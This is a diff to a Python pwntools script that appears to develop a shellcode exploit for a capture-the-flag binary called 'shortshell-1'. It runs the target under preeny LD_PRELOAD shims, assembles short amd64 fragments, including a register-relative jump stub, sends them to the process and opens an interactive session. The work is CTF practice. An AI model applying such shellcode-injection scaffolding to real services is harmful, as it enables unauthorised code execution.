@@ -6,12 +6,14 @@ pwn.context.arch = 'amd64'
 
 f = lambda x: hex(pwn.u32(x))
 shellarr = []
+read_arr = []
 
 def run():
     p = pwn.process('./shortshell-1', env=envdic)
     raw_input('@')
-    for i in shellarr:
+    for i in read_arr:
         p.send(pwn.asm(i))    
+        print (i)
     p.interactive()
 
 def remoterun():
@@ -22,7 +24,7 @@ def remoterun():
 
 def prun():
     needmod = []
-    for idx, ele in enumerate(shellarr):
+    for idx, ele in enumerate(read_arr):
         print str(idx) + '--------------------------'
         print pwn.disasm(pwn.asm(ele))
         print "---------------- size : " + str(len(pwn.asm(ele))) + "  "
@@ -36,11 +38,19 @@ def prun():
         
 
 envdic = {
-    'LD_PRELOAD' : '/home/robinlin/preeny/x86_64-linux-gnu/desock.so:/home/robinlin/preeny/x86_64-linux-gnu/defork.so:/home/robinlin/preeny/x86_64-linux-gnu/dealarm.so'
+    'LD_PRELOAD' : '/home/user/preeny/x86_64-linux-gnu/desock.so:/home/user/preeny/x86_64-linux-gnu/defork.so:/home/user/preeny/x86_64-linux-gnu/dealarm.so'
 }
 
+read_ = """
+        lea rax, [rbp-0x70]
+        xor edi, 0x0
+        """
+
+read_arr.append(read_)
+
+
 init = """
-        lea rbx, [r8-0xcf]
+        lea rbx, [r12-0xcf]
         jmp rbx
         nop
         """
